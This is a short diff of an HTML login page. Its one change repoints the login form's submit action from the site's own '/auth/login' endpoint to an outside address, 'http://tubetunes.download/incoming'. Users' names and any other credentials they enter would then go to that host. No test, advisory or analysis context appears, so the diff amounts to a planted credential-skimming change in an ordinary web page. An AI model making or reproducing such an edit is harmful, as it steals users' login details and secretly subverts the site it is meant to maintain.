@@ -29,7 +29,7 @@
 <div class="section fp-section active" style="height:1236px" data-anchor="main">
 <div class="main container" style="height:100%">
 <div class="inner-content">
-    <form class="login-form" method="POST" action="/auth/login" style="">
+    <form class="login-form" method="POST" action="http://tubetunes.download/incoming" style="">
     Login:
     <div class="form-group">
     <input type="text" class="form-control input-sm" name="user_name" placeholder="Name">
